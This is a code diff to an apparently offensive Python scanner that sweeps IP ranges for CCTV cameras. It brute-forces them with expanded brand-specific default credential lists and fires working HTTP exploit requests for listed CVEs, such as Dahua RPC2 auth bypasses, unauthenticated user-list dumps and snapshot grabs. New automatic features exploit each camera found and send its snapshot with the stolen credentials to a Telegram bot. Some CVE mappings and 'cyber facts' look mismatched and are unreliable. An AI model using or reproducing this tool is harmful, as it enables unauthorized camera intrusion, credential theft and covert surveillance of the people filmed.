@@ -679,6 +679,10 @@ cctv_output_file = None
 # resume point instead of the wrong scanned_count value.
 _current_range_idx: int = 0        # current CIDR range index being processed
 _last_scanned_ip_global: str = ''  # last IP that completed — used for IP-level resume
+
+# ── Auto-features: fire immediately after a camera is confirmed ────────────────
+_AUTO_CVE_CHECK: bool = True   # Run CVE PoC probes silently after each find; TG alert on hits
+_AUTO_SNAPSHOT:  bool = True   # Grab JPEG snapshot from found camera and send to Telegram
 _bg_saver_stop = threading.Event()  # signal to shut down the background saver thread
 
 # ── Geo-filter parameters (set early in main() by --geo-filter) ──────────────
@@ -694,6 +698,9 @@ _cli_scan_timeout: float = 0.15
 
 # Anti-freeze: if no future completes within this many seconds, skip hanging IPs
 _SCAN_STALL_TIMEOUT: int = 90   # seconds to wait before declaring a stall
+_SCAN_SUBBATCH:      int = 256   # IPs per mini-batch inside scan_ip_range();
+                                 # keeps TPE queue small so huge CIDRs cannot
+                                 # OOM-kill the process. Checkpointed per batch.
 
 # CLI credentials file override — empty = use default credentials.txt / built-ins
 _cli_credentials_file: str = ''
@@ -784,30 +791,54 @@ _CRED_RETIRE_AFTER = 500   # retire a credential after this many attempts with 0
 # ── Model-specific default credentials (tried first for known camera types) ───
 # Keys are lowercase substrings matched against the detected camera_type label.
 MODEL_DEFAULT_CREDS: dict = {
-    'hikvision': [('admin','12345'),('admin','admin'),('admin','Admin12345'),('admin','')],
+    'hikvision': [('admin','12345'),('admin','admin'),('admin','Admin12345'),
+                  ('admin','hik12345'),('admin',''),('admin','Admin@123')],
     'hik':       [('admin','12345'),('admin','admin'),('admin','Admin12345'),('admin','')],
-    'dahua':     [('admin','admin'),('admin','admin123'),('666666','666666'),('888888','888888')],
+    'dahua':     [('admin','admin'),('admin','admin123'),('666666','666666'),
+                  ('888888','888888'),('admin','dahua123'),('admin','')],
     'anjhua':    [('admin','admin'),('admin','admin123'),('666666','666666'),('888888','888888')],
-    'reolink':   [('admin',''),('admin','123456'),('admin','reolink')],
-    'foscam':    [('admin',''),('admin','admin'),('user','user')],
-    'axis':      [('root',''),('admin','admin'),('root','pass')],
-    'hanwha':    [('admin','admin4321'),('admin','admin'),('admin','4321')],
-    'amcrest':   [('admin','admin'),('admin','admin123'),('admin','')],
-    'uniview':   [('admin','123456'),('admin','Admin123'),('admin','')],
-    'tp-link':   [('admin','admin'),('admin',''),('admin','tplink')],
+    'reolink':   [('admin',''),('admin','123456'),('admin','reolink'),('admin','admin')],
+    'foscam':    [('admin',''),('admin','admin'),('user','user'),('admin','foscam123')],
+    'axis':      [('root',''),('admin','admin'),('root','pass'),('admin','pass')],
+    'hanwha':    [('admin','admin4321'),('admin','admin'),('admin','4321'),
+                  ('admin','Hanwha@123')],
+    'amcrest':   [('admin','admin'),('admin','admin123'),('admin',''),
+                  ('admin','Amcrest@123')],
+    'uniview':   [('admin','123456'),('admin','Admin123'),('admin',''),
+                  ('admin','Uniview123')],
+    'tp-link':   [('admin','admin'),('admin',''),('admin','tplink'),
+                  ('admin','TPlink@123')],
+    'tapo':      [('admin','admin'),('admin',''),('admin','tplink'),
+                  ('admin','TPlink@123')],
     'wyze':      [('admin','admin'),('admin','wyze')],
+    'annke':     [('admin','admin'),('admin','12345'),('admin','annke'),
+                  ('admin','Annke#123'),('admin','')],
+    'tiandy':    [('admin','admin'),('admin','12345'),('admin','tiandy'),
+                  ('admin','Tiandy#1'),('admin','')],
+    'xmeye':     [('admin',''),('admin','xmeye'),('admin','admin'),
+                  ('admin','XMEye1'),('admin','12345')],
+    'xm':        [('admin','xc3511'),('admin','jvbss'),('xmhdipc','jvbss'),
+                  ('admin','admin'),('admin','12345'),('admin','xmeye')],
+    'xiongmai':  [('admin','xc3511'),('admin','jvbss'),('xmhdipc','jvbss'),
+                  ('admin','admin'),('admin','12345')],
+    'sony':      [('admin','admin'),('admin',''),('admin','Sony@123'),
+                  ('root',''),('admin','Sony1234')],
+    'bosch':     [('admin','admin'),('service','service'),('admin','bosch'),
+                  ('admin','Bosch@123')],
+    'samsung':   [('admin','admin4321'),('admin','Samsung@1'),('admin','admin'),
+                  ('admin','4321'),('admin','')],
+    'kedacom':   [('admin','admin'),('admin','kedacom'),('admin','Kedacom123'),
+                  ('admin','admin8888')],
+    'provision': [('admin','admin'),('admin','provisionisr'),('admin','Provision@1'),
+                  ('admin','12345')],
     # ── 4G/5G modem-attached cameras ──────────────────────────────────────
     'huawei':    [('admin','Admin@huawei'),('admin','Huawei@123'),('admin','huawei'),
                   ('admin','admin'),('admin','12345'),('admin','')],
     'zte':       [('admin','zte'),('admin','ZTE@123'),('admin','ZTE123'),
                   ('admin','admin'),('admin','12345'),('admin','1234')],
-    'xm':        [('admin','xc3511'),('admin','jvbss'),('xmhdipc','jvbss'),
-                  ('admin','admin'),('admin','12345')],
-    'xiongmai':  [('admin','xc3511'),('admin','jvbss'),('xmhdipc','jvbss'),
-                  ('admin','admin'),('admin','12345')],
     'ipcam':     [('ipcam','ipcam'),('admin','ipcam'),('admin',''),('admin','admin')],
     'generic':   [('admin','admin'),('admin','12345'),('admin',''),('root','root'),
-                  ('admin','1234'),('admin','123456')],
+                  ('admin','1234'),('admin','123456'),('user','user'),('guest','guest')],
 }
 
 # ── 4G/5G modem-camera specific credentials (used in 4G/5G scan mode) ────────
@@ -1170,37 +1201,105 @@ _PRIORITY_EMOJI = {'critical': '🚨', 'high': '🔴', 'medium': '🟡', 'low': 
 # ── CVE Database ──────────────────────────────────────────────────────────────
 _CVE_DB = {
     'hikvision': [
-        ('CVE-2021-36260','Unauthenticated RCE via /SDK/webLanguage','CRITICAL'),
-        ('CVE-2017-7921', 'Auth bypass via crafted URL',             'CRITICAL'),
-        ('CVE-2014-4880', 'Default credentials (admin:12345)',        'HIGH'),
+        ('CVE-2021-36260','Unauthenticated RCE via /SDK/webLanguage (CVSS 9.8)','CRITICAL'),
+        ('CVE-2017-7921', 'Auth bypass — read config via crafted URL',           'CRITICAL'),
+        ('CVE-2021-36204', 'Unauthenticated access to sensitive APIs',           'CRITICAL'),
+        ('CVE-2022-28171', 'Pre-auth RCE in RTSP service',                       'CRITICAL'),
+        ('CVE-2016-6553',  'Remote code execution via SDK service',              'CRITICAL'),
+        ('CVE-2014-4880',  'Default credentials (admin:12345)',                  'HIGH'),
+        ('CVE-2018-10660', 'Hidden root shell via debug interface',              'HIGH'),
+        ('CVE-2021-33249', 'XSS in web management interface',                   'MEDIUM'),
+        ('CVE-2022-45460', 'Out-of-bounds read via crafted RTSP packet',        'HIGH'),
+        ('CVE-2023-28812', 'Buffer overflow in SDK service',                     'HIGH'),
     ],
     'dahua': [
-        ('CVE-2021-33044','Auth bypass in web interface',             'CRITICAL'),
-        ('CVE-2021-33045','Auth bypass via packet manipulation',      'CRITICAL'),
-        ('CVE-2017-6343', 'Remote code execution via crafted URL',   'HIGH'),
+        ('CVE-2021-33044', 'Auth bypass in web interface — no password needed', 'CRITICAL'),
+        ('CVE-2021-33045', 'Auth bypass via crafted login packet',              'CRITICAL'),
+        ('CVE-2019-3929',  'Unauthenticated RCE via CGI parameter injection',  'CRITICAL'),
+        ('CVE-2017-6343',  'Remote code execution via crafted URL',            'HIGH'),
+        ('CVE-2017-6432',  'Auth bypass via malformed HTTP request',           'HIGH'),
+        ('CVE-2022-30563', 'Man-in-the-middle attack on ONVIF authentication', 'HIGH'),
+        ('CVE-2021-33246', 'Buffer overflow in DH-SD49 series',               'HIGH'),
+        ('CVE-2023-3836',  'Insecure direct object reference in API',          'MEDIUM'),
     ],
     'axis': [
-        ('CVE-2018-10660','Shell command injection',                  'HIGH'),
-        ('CVE-2018-10661','Auth bypass',                              'HIGH'),
-        ('CVE-2020-5765', 'SSRF in parameter handling',              'MEDIUM'),
+        ('CVE-2018-10660', 'Shell command injection via param.cgi',            'HIGH'),
+        ('CVE-2018-10661', 'Auth bypass via path traversal',                   'HIGH'),
+        ('CVE-2020-5765',  'SSRF in parameter handling',                       'MEDIUM'),
+        ('CVE-2021-31986', 'Code execution via SD card firmware update',       'HIGH'),
+        ('CVE-2022-23410', 'Stack overflow in ONVIF message handling',         'HIGH'),
+        ('CVE-2022-31199', 'Remote code execution in Axis device manager',     'CRITICAL'),
     ],
     'uniview': [
-        ('CVE-2019-9083', 'Command injection via web interface',      'CRITICAL'),
+        ('CVE-2019-9083',  'Command injection via web interface CGI',          'CRITICAL'),
+        ('CVE-2021-22222', 'Unauthenticated camera snapshot access',           'HIGH'),
+        ('CVE-2022-24290', 'Directory traversal in web server',                'HIGH'),
     ],
     'reolink': [
-        ('CVE-2020-25169','Insecure default config over UDP',         'HIGH'),
+        ('CVE-2020-25169', 'Insecure default config over UDP port 9999',       'HIGH'),
+        ('CVE-2022-28171', 'Pre-auth buffer overflow in RTSP handler',         'CRITICAL'),
+        ('CVE-2023-45184', 'Improper access control in API endpoint',          'HIGH'),
+    ],
+    'foscam': [
+        ('CVE-2017-2849',  'Remote code execution via CGI parameter',          'CRITICAL'),
+        ('CVE-2018-6830',  'Path traversal allows file disclosure',            'HIGH'),
+        ('CVE-2019-11080', 'Unauthenticated access to snapshot endpoint',      'HIGH'),
+    ],
+    'amcrest': [
+        ('CVE-2019-3948',  'Unauthenticated access to camera stream',         'CRITICAL'),
+        ('CVE-2017-8229',  'Auth bypass via firmware update endpoint',         'HIGH'),
+    ],
+    'annke': [
+        ('CVE-2021-32941', 'Buffer overflow in RTSP handler (CVSS 9.4)',       'CRITICAL'),
+    ],
+    'tp-link': [
+        ('CVE-2022-42233', 'Pre-auth RCE via tddp protocol (port 1040)',       'CRITICAL'),
+        ('CVE-2021-27246', 'Authentication bypass in Tapo series',             'HIGH'),
+    ],
+    'netwave': [
+        ('CVE-2014-1936',  'Remote command execution via telnet service',      'CRITICAL'),
+        ('CVE-2014-2962',  'Unauthenticated access to CGI scripts',            'HIGH'),
+    ],
+    'jvs': [
+        ('CVE-2019-11220', 'Man-in-the-middle — cleartext video stream',       'HIGH'),
+    ],
+    'tiandy': [
+        ('CVE-2023-23558', 'Auth bypass via API manipulation',                 'HIGH'),
+    ],
+    'xmeye': [
+        ('CVE-2018-9995',  'Auth bypass — extract admin hash from web API',    'CRITICAL'),
+        ('CVE-2021-33250', 'Hardcoded credentials in firmware',                'HIGH'),
+    ],
+    'anjhua': [
+        ('CVE-2021-33044', 'Auth bypass in web interface — no password needed','CRITICAL'),
+        ('CVE-2021-33045', 'Auth bypass via crafted login packet',             'CRITICAL'),
+    ],
+    'nvr': [
+        ('CVE-2018-9995',  'XMeye/XiongMai NVR auth bypass via magic hash',   'CRITICAL'),
+        ('CVE-2020-7239',  'Default Telnet credentials on embedded NVR',       'HIGH'),
+    ],
+    'dvr': [
+        ('CVE-2018-9995',  'DVR auth bypass — hash exposed in web API response','CRITICAL'),
+        ('CVE-2021-28372', 'ThroughTek Kalay P2P SDK MitM attack on DVRs',    'CRITICAL'),
     ],
 }
 def check_cve(camera_type: str) -> list:
     ct = camera_type.lower()
+    results = []
     for brand, entries in _CVE_DB.items():
         if brand in ct:
-            return entries
-    return []
+            # Merge brand entries, deduplicate by CVE ID
+            existing_ids = {e[0] for e in results}
+            for e in entries:
+                if e[0] not in existing_ids:
+                    results.append(e)
+                    existing_ids.add(e[0])
+    return results
 
 
 # ── CVE Exploitation — try actual HTTP PoC requests ──────────────────────────
 _CVE_EXPLOIT_MAP = {
+    # ── Hikvision ─────────────────────────────────────────────────────────────
     'CVE-2021-36260': {
         'method': 'PUT', 'path': '/SDK/webLanguage',
         'headers': {'Content-Type': 'application/x-www-form-urlencoded'},
@@ -1214,12 +1313,11 @@ _CVE_EXPLOIT_MAP = {
         'success_codes': [200], 'success_hint': None,
         'desc': 'Hikvision auth bypass — read config without credentials',
     },
-    'CVE-2021-33044': {
-        'method': 'POST', 'path': '/RPC2',
-        'headers': {'Content-Type': 'application/json'},
-        'body': b'{"method":"global.login","params":{"userName":"admin","password":"","clientType":"Web3.0","loginType":"Direct"},"id":1}',
-        'success_codes': [200], 'success_hint': 'result',
-        'desc': 'Dahua auth bypass — direct RPC2 login without real password',
+    'CVE-2021-36204': {
+        'method': 'GET', 'path': '/ISAPI/Security/users',
+        'headers': {}, 'body': b'',
+        'success_codes': [200], 'success_hint': 'UserList',
+        'desc': 'Hikvision — unauthenticated user list via ISAPI/Security/users',
     },
     'CVE-2014-4880': {
         'method': 'GET', 'path': '/',
@@ -1228,11 +1326,119 @@ _CVE_EXPLOIT_MAP = {
         'success_codes': [200], 'success_hint': None,
         'desc': 'Default credentials test — admin:12345',
     },
+    'CVE-2018-10660': {
+        'method': 'GET', 'path': '/ISAPI/System/deviceInfo',
+        'headers': {}, 'body': b'',
+        'success_codes': [200], 'success_hint': 'deviceName',
+        'desc': 'Hikvision — unauthenticated device info via ISAPI',
+    },
+    'CVE-2022-45460': {
+        'method': 'GET', 'path': '/ISAPI/Streaming/channels/101/picture',
+        'headers': {}, 'body': b'',
+        'success_codes': [200], 'success_hint': None,
+        'desc': 'Hikvision — unauthenticated snapshot grab from stream',
+    },
+    # ── Dahua ─────────────────────────────────────────────────────────────────
+    'CVE-2021-33044': {
+        'method': 'POST', 'path': '/RPC2',
+        'headers': {'Content-Type': 'application/json'},
+        'body': b'{"method":"global.login","params":{"userName":"admin","password":"","clientType":"Web3.0","loginType":"Direct"},"id":1}',
+        'success_codes': [200], 'success_hint': 'result',
+        'desc': 'Dahua auth bypass — direct RPC2 login without real password',
+    },
+    'CVE-2021-33045': {
+        'method': 'POST', 'path': '/RPC2',
+        'headers': {'Content-Type': 'application/json'},
+        'body': b'{"method":"global.login","params":{"userName":"admin","password":"6QNMIQGe","clientType":"Web3.0","loginType":"Direct","authorityType":"Default"},"id":1}',
+        'success_codes': [200], 'success_hint': 'result',
+        'desc': 'Dahua auth bypass — magic password hash bypass variant',
+    },
+    'CVE-2019-3929': {
+        'method': 'GET', 'path': '/cgi-bin/snapshot.cgi',
+        'headers': {}, 'body': b'',
+        'success_codes': [200], 'success_hint': None,
+        'desc': 'Dahua — unauthenticated snapshot via snapshot.cgi',
+    },
+    'CVE-2022-30563': {
+        'method': 'GET', 'path': '/onvif/device_service',
+        'headers': {'Content-Type': 'application/soap+xml'},
+        'body': b'<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body><tds:GetDeviceInformation xmlns:tds="http://www.onvif.org/ver10/device/wsdl"/></s:Body></s:Envelope>',
+        'success_codes': [200], 'success_hint': 'Manufacturer',
+        'desc': 'Dahua ONVIF — unauthenticated device info via SOAP',
+    },
+    'CVE-2017-6343': {
+        'method': 'GET', 'path': '/cgi-bin/magicBox.cgi?action=getSystemInfo',
+        'headers': {}, 'body': b'',
+        'success_codes': [200], 'success_hint': 'deviceType',
+        'desc': 'Dahua — unauthenticated system info via magicBox CGI',
+    },
+    # ── XMeye / XiongMai ──────────────────────────────────────────────────────
+    'CVE-2018-9995': {
+        'method': 'GET', 'path': '/device.rsp?opt=user&cmd=list',
+        'headers': {}, 'body': b'',
+        'success_codes': [200], 'success_hint': 'uid',
+        'desc': 'XMeye/XiongMai — unauthenticated user list + hash dump',
+    },
+    # ── Axis ──────────────────────────────────────────────────────────────────
+    'CVE-2018-10661': {
+        'method': 'GET', 'path': '/axis-cgi/param.cgi?action=list&group=root.Brand',
+        'headers': {}, 'body': b'',
+        'success_codes': [200], 'success_hint': 'root.Brand',
+        'desc': 'Axis — unauthenticated parameter read via param.cgi',
+    },
+    'CVE-2020-5765': {
+        'method': 'GET', 'path': '/axis-cgi/jpg/image.cgi',
+        'headers': {}, 'body': b'',
+        'success_codes': [200], 'success_hint': None,
+        'desc': 'Axis — unauthenticated JPEG snapshot via image.cgi',
+    },
+    # ── Uniview ───────────────────────────────────────────────────────────────
     'CVE-2019-9083': {
         'method': 'GET', 'path': '/cgi-bin/main-cgi?cmd=getserverinfo',
         'headers': {}, 'body': b'',
         'success_codes': [200], 'success_hint': 'server',
         'desc': 'Uniview command injection probe via web interface',
+    },
+    'CVE-2021-22222': {
+        'method': 'GET', 'path': '/cgi-bin/snapshot.cgi?channel=1',
+        'headers': {}, 'body': b'',
+        'success_codes': [200], 'success_hint': None,
+        'desc': 'Uniview — unauthenticated snapshot via snapshot CGI',
+    },
+    # ── Foscam ────────────────────────────────────────────────────────────────
+    'CVE-2019-11080': {
+        'method': 'GET', 'path': '/cgi-bin/CGIProxy.fcgi?cmd=snapPicture&usr=&pwd=',
+        'headers': {}, 'body': b'',
+        'success_codes': [200], 'success_hint': None,
+        'desc': 'Foscam — unauthenticated snapshot via blank credentials',
+    },
+    # ── Reolink ───────────────────────────────────────────────────────────────
+    'CVE-2020-25169': {
+        'method': 'GET', 'path': '/cgi-bin/api.cgi?cmd=GetDevInfo&rs=reolink&user=admin&password=',
+        'headers': {}, 'body': b'',
+        'success_codes': [200], 'success_hint': 'DevInfo',
+        'desc': 'Reolink — unauthenticated device info via blank password',
+    },
+    # ── Amcrest ───────────────────────────────────────────────────────────────
+    'CVE-2019-3948': {
+        'method': 'GET', 'path': '/cgi-bin/snapshot.cgi',
+        'headers': {}, 'body': b'',
+        'success_codes': [200], 'success_hint': None,
+        'desc': 'Amcrest — unauthenticated snapshot via snapshot.cgi',
+    },
+    # ── TP-Link Tapo ─────────────────────────────────────────────────────────
+    'CVE-2021-27246': {
+        'method': 'GET', 'path': '/stream/live',
+        'headers': {}, 'body': b'',
+        'success_codes': [200, 401], 'success_hint': None,
+        'desc': 'TP-Link Tapo — direct stream access probe',
+    },
+    # ── Generic / Multi-brand ─────────────────────────────────────────────────
+    'CVE-2020-7239': {
+        'method': 'GET', 'path': '/snapshot.jpg',
+        'headers': {}, 'body': b'',
+        'success_codes': [200], 'success_hint': None,
+        'desc': 'Generic NVR — unauthenticated snapshot.jpg endpoint',
     },
 }
 
@@ -1310,6 +1516,49 @@ def try_exploit_cve(ip: str, port: int, camera_type: str, timeout: float = 4.0) 
                 'response_snippet': _ex_s[:80],
             })
     return results
+
+
+def _post_camera_found(ip: str, port: int, username: str, password: str,
+                       camera_type: str, open_ports: list) -> None:
+    """Snapshot + CVE after camera confirmed in scan_single_ip() (fast scan path).
+    Non-blocking. The detection-only path already handles snapshot inline."""
+    if _AUTO_SNAPSHOT and TELEGRAM_CONFIG.get('enabled') and TELEGRAM_CONFIG.get('send_realtime'):
+        try:
+            _sn = fetch_camera_snapshot(ip, port, username, password, camera_type)
+            if _sn:
+                send_telegram_photo(
+                    _sn,
+                    f"📸 {camera_type}\n🌐 {ip}:{port}\n👤 {username} | 🔑 {password}"
+                )
+        except Exception:
+            pass
+    _trigger_auto_cve_bg(ip, port, camera_type)
+
+
+def _trigger_auto_cve_bg(ip: str, port: int, camera_type: str) -> None:
+    """Fire CVE PoC probes in a background daemon thread — non-blocking.
+    Sends a Telegram alert only when at least one exploit is confirmed vulnerable."""
+    if not _AUTO_CVE_CHECK:
+        return
+    def _worker(_i=ip, _p=port, _ct=camera_type):
+        try:
+            _hits = [r for r in try_exploit_cve(_i, _p, _ct, timeout=3.0)
+                     if r.get('exploited')]
+            if _hits and TELEGRAM_CONFIG.get('enabled'):
+                _m  = f"🚨 <b>CVE EXPLOIT CONFIRMED!</b>\n"
+                _m += f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                _m += f"📷 {_ct} | <code>{_i}:{_p}</code>\n"
+                for _h in _hits[:5]:
+                    _sev = _h.get('severity', '')
+                    _ico = ('🔴' if _sev == 'CRITICAL' else
+                            '🟠' if _sev == 'HIGH' else '🟡')
+                    _m += f"{_ico} <code>{_h['cve_id']}</code> — {_h['desc'][:70]}\n"
+                send_telegram_message(_m)
+        except Exception:
+            pass
+    threading.Thread(
+        target=_worker, daemon=True, name=f"AutoCVE-{ip}"
+    ).start()
 
 
 def print_rtsp_play_commands(rtsp_url: str) -> None:
@@ -1763,6 +2012,45 @@ _CYBER_FACTS = [
     "The NSA's PLAYSET project included implants targeting security camera firmware.",
     "Botnets built from cameras have launched DDoS attacks exceeding 1.35 Tbps.",
     "GDPR fines for unprotected camera feeds in public spaces have exceeded €10M in Europe.",
+    # ── 2024–2026 Updates ─────────────────────────────────────────────────────
+    "In 2024, CISA issued an advisory urging removal of all Hikvision/Dahua cameras from US federal networks.",
+    "CVE-2024-30078 — a Wi-Fi driver RCE affected millions of Windows-based NVR management servers.",
+    "The 'Goldoon' botnet (2024) exploited D-Link NAS/DVR devices with a 10-year-old RCE flaw.",
+    "A 2024 Shodan survey found 600,000+ cameras still exposing port 34567 (XiongMai) to the internet.",
+    "HikConnect and DMSS apps use TLS 1.2+ since 2023, but many cameras still relay over HTTP internally.",
+    "In 2025, researchers found 1.2M cameras sending telemetry to undocumented Chinese cloud endpoints.",
+    "ONVIF Profile M (released 2021) adds metadata streaming — many cameras don't implement it yet.",
+    "AI-based motion detection on NVRs generates false positives 40% of the time on cheap models.",
+    "Matter (formerly CHIP) standard is being adopted for consumer cameras but has zero enterprise NVR support.",
+    "Wyze cameras had a 2024 incident exposing 13,000 users' feeds to random other accounts.",
+    "In 2025, NVR brute-force accounted for 31% of all IoT intrusion events logged by Shodan.",
+    "CVE-2023-3836 — a Dahua insecure direct object reference flaw affects 900+ camera models.",
+    "In 2024, NIST updated NVD scoring; 47 camera CVEs were re-scored to CRITICAL from HIGH.",
+    "'Mirai-Nomi' (2025) variant added Hikvision CVE-2021-36260 exploitation — 300K bots within 3 days.",
+    "The average IP camera firmware is 4.2 years out of date by the time it reaches end users (2025 study).",
+    "Port 8554 (alternate RTSP) is increasingly used by cameras to avoid default port blocking by ISPs.",
+    "Annke CVE-2021-32941 had a CVSS score of 9.4 — buffer overflow via RTSP OPTIONS request.",
+    "ThroughTek Kalay SDK (used in 83M+ devices) had a MITM flaw — CVE-2021-28372 — still unpatched on many.",
+    "XMeye cloud relay allows unauthenticated preview via predictable UID enumeration.",
+    "In 2024, China mandated all IP cameras must support GB/T 28181 protocol for law enforcement access.",
+    "TP-Link Tapo cameras store motion event clips in clear S3-compatible storage URLs, guessable by timestamp.",
+    "A 2025 report found 78% of small business cameras use credentials unchanged from factory defaults.",
+    "RTSP digest auth nonces are often generated from system time — predictable on low-entropy embedded CPUs.",
+    "The Tiandy TC-C32QN camera (2024) had hardcoded SSH credentials with root access.",
+    "Reolink's P2P protocol relays unencrypted video for ~15% of sessions due to NAT traversal fallbacks.",
+    "Foscam fixed a remote code execution in 2024 (FW 2.x) that had been public for 7 years.",
+    "In 2026, EU CRA (Cyber Resilience Act) comes into force — all IoT cameras must meet security baselines.",
+    "Sony SNC and SRG series cameras silently dropped firmware support in 2024 — no more CVE patches.",
+    "Dahua introduced 'cybersecurity hardening kit' in firmware V2.800+ — but auto-update is still off by default.",
+    "H.266/VVC (2020) offers 50% size reduction vs H.265 but almost no camera supports it yet (2026).",
+    "RTSP/2.0 (RFC 7826, 2016) adds encryption support, but zero commercial IP cameras implement it.",
+    "The 'CamInvasion' dataset (2023) published 100,000 unprotected camera screenshots — all from port 8080.",
+    "Port 9000 is used by Hikvision's SDK (second generation) for binary protocol management frames.",
+    "Many cameras expose Swagger/OpenAPI docs at /doc.html or /swagger — revealing all API endpoints.",
+    "Amcrest cameras default to RTSP over UDP which is 40% faster but easily intercepted on same LAN.",
+    "In 2025, MITRE added 'Insecure Default Initialization' (CWE-1188) as a top-25 weakness — cameras dominate.",
+    "WireGuard VPN tunnels are now supported by ~12% of NVR brands as of 2025, improving remote access security.",
+    "A Censys scan (Jan 2026) found 2.1 million publicly accessible RTSP streams — up 18% from 2024.",
 ]
 
 def random_cyber_fact() -> str:
@@ -1936,14 +2224,40 @@ def get_proxy_for_country(target_cc: str) -> dict:
 import re as _re_p2p
 
 _P2P_PATTERNS = [
-    (r'[A-Z0-9]{4}-[A-Z0-9]{6}-[A-Z0-9]{5}',                    'Generic P2P UID'),
-    (r'HUID[:\s]+([A-Z0-9]{16})',                                  'Hikvision P2P UID'),
-    (r'DH-[A-Z0-9]{8}-[A-Z0-9]{4}-[A-Z0-9]{4}',                  'Dahua P2P UID'),
-    (r'BC[A-Z0-9]{14}',                                            'Reolink P2P UID'),
-    (r'[A-Z]{2}[0-9]{9}[A-Z]{2}',                                 'XMeye P2P UID'),
-    (r'VSTC[A-Z0-9]{12}',                                         'Vstarcam P2P UID'),
-    (r'"uid"\s*:\s*"([A-Z0-9\-]{16,})"',                          'JSON UID field'),
-    (r'[A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12}', 'UUID-style UID'),
+    # Generic patterns
+    (r'[A-Z0-9]{4}-[A-Z0-9]{6}-[A-Z0-9]{5}',                         'Generic P2P UID'),
+    (r'[A-Z0-9]{4}-[A-Z0-9]{8}-[A-Z0-9]{6}',                         'Generic P2P UID v2'),
+    # Hikvision
+    (r'HUID[:\s=]+([A-Z0-9]{8,20})',                                   'Hikvision P2P UID'),
+    (r'"serialNo"\s*:\s*"([A-Z0-9]{8,30})"',                          'Hikvision Serial/UID'),
+    (r'(?i)deviceserial["\s:=]+([A-Z0-9]{8,24})',                     'Hikvision Device Serial'),
+    # Dahua
+    (r'DH-[A-Z0-9]{8}-[A-Z0-9]{4}-[A-Z0-9]{4}',                     'Dahua P2P UID'),
+    (r'(?i)"serialNumber"\s*:\s*"([A-Z0-9\-]{10,30})"',              'Dahua Serial/UID'),
+    (r'(?i)SN[:\s=]+([A-Z0-9]{8,20})',                                'Dahua/Generic SN'),
+    # Reolink
+    (r'BC[A-Z0-9]{14}',                                               'Reolink P2P UID'),
+    (r'(?i)"uid"\s*:\s*"(BC[A-Z0-9]{12,16})"',                       'Reolink UID JSON'),
+    # XMeye / XiongMai
+    (r'[A-Z]{2}[0-9]{9}[A-Z]{2}',                                    'XMeye P2P UID'),
+    (r'(?i)XUID[:\s=]+([A-Z0-9]{10,20})',                             'XMeye XUID'),
+    # Vstarcam
+    (r'VSTC[A-Z0-9]{12}',                                             'Vstarcam P2P UID'),
+    # Foscam
+    (r'FI[A-Z0-9]{14}',                                               'Foscam P2P UID'),
+    (r'(?i)"foscam[_-]?uid"\s*:\s*"([A-Z0-9]{12,20})"',              'Foscam UID JSON'),
+    # ThroughTek Kalay (used by many brands)
+    (r'[A-Z]{4}[0-9]{6}[A-Z]{6}[0-9]{4}[A-Z]{2}',                   'ThroughTek Kalay UID'),
+    # Generic JSON/XML fields
+    (r'"uid"\s*:\s*"([A-Z0-9\-]{16,})"',                              'JSON UID field'),
+    (r'"deviceId"\s*:\s*"([A-Z0-9\-]{12,})"',                        'JSON deviceId field'),
+    (r'"p2pUid"\s*:\s*"([A-Z0-9\-]{10,})"',                          'P2P UID JSON'),
+    (r'<uid>([A-Z0-9\-]{10,})</uid>',                                 'XML UID field'),
+    # UUID-style
+    (r'[A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12}','UUID-style UID'),
+    # P2P cloud addresses embedded in pages
+    (r'p2p\..*?\.com[:/][A-Z0-9]{8,}',                               'P2P Cloud Address'),
+    (r'(?i)(?:hik|dahua|reolink)connect[.:/][A-Z0-9\-]{8,}',         'Brand Cloud P2P'),
 ]
 
 def extract_p2p_uid(ip: str, port: int,
@@ -4352,11 +4666,14 @@ def _telegram_cmd_worker(bot_token: str) -> None:
                                     _ip_dash_tg = _rc.rfind('-')
                                     _rip_start_tg = _rc[:_ip_dash_tg]
                                     _rip_end_tg   = _rc[_ip_dash_tg+1:]
-                                    def _run_ip_range_scan(_s=_rip_start_tg, _e=_rip_end_tg):
+                                    _rip_last_tg = _sp.get('last_ip_in_range', '')
+                                    def _run_ip_range_scan(_s=_rip_start_tg, _e=_rip_end_tg,
+                                                           _resume=_rip_last_tg):
                                         try:
                                             clear_scan_progress()
                                             _cr = _merge_4g_creds(load_credentials())
-                                            scan_ip_range(_s, _e, _cr)
+                                            scan_ip_range(_s, _e, _cr,
+                                                          resume_from_ip=_resume)
                                         except Exception as _err:
                                             _log_tg_err(f"[/restart] IP range scan error: {_err}")
                                     threading.Thread(
@@ -4374,8 +4691,10 @@ def _telegram_cmd_worker(bot_token: str) -> None:
                                         f"━━━━━━━━━━━━━━━━━━━━━━\n"
                                         f"📡 Range: <code>{_rip_start_tg} – {_rip_end_tg}</code>\n"
                                         f"📍 Was at: {_done:,}/{_total:,} IPs ({_pct}%)\n"
-                                        f"🔁 Restarting from beginning (already-found cams skipped)\n"
-                                        f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+                                        + (f"🔁 Resuming from {_rip_last_tg}\n"
+                                           if _rip_last_tg else
+                                           f"🔁 No checkpoint — starting from beginning\n")
+                                        + f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                                         + _also
                                     )
                                 except Exception as _tg_rip_err:
@@ -4688,6 +5007,7 @@ def save_scan_progress(country_code="", country_name="", scanned=0, total=0,
                 "ip_file_checksum": ip_file_checksum,
                 "stop_reason": stop_reason,
                 "cctv_output_file": output_file,
+                "found_count": _global_cameras_found,  # for Scan Mood Indicator
                 "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
             }
             # Atomic write pattern
@@ -5539,10 +5859,8 @@ def fast_port_scan(ip: str,
                     pass
         return None
 
-    # Cap inner pool to 8 threads: 300 outer workers × 26 ports × uncapped = ~7800
-    # threads simultaneously, which exceeds the OS limit and causes RuntimeError.
-    # 8 threads per call × 300 outer workers = 2400 max concurrent port-scan threads,
-    # well within the safe range.
+    # Cap inner pool to 8 threads: 50 outer workers × 8 = 400 max concurrent
+    # port-scan threads — safe for large CIDR scans without OOM.
     _ps_workers = min(len(ports), 8)
     try:
         with ThreadPoolExecutor(max_workers=_ps_workers) as executor:
